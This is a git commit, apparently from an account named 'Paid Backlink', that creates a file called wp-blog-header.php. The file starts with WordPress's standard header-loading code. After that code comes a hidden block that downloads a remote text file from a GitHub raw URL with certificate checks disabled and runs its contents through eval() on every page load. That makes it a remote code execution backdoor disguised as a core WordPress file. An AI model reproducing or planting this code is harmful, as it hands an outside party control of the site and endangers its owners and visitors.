6e324ff64e21ccd8c196580bdc9b477e04c8633c
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2024-03-10 19:15:11 +0800

    Create wp-blog-header.php

---
+++ wp-blog-header.php
@@ -0,0 +1,32 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+?>
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/vipv2/main/system.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
